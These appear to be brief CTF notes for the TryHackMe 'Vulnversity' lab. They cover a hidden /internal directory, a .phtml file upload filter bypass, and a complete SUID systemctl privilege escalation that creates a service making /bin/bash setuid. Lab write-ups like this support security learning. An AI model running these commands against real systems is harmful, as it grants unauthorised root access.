Try Hack Me - Vulnversity 

# Interesting enum

1. Interesting directory: /internal

2. Exploit

```
File upload vulnerabilities bypass with .phtml
```

3. Privilege escalation

```
SUID systemctl

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash" # SETUID binary
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```
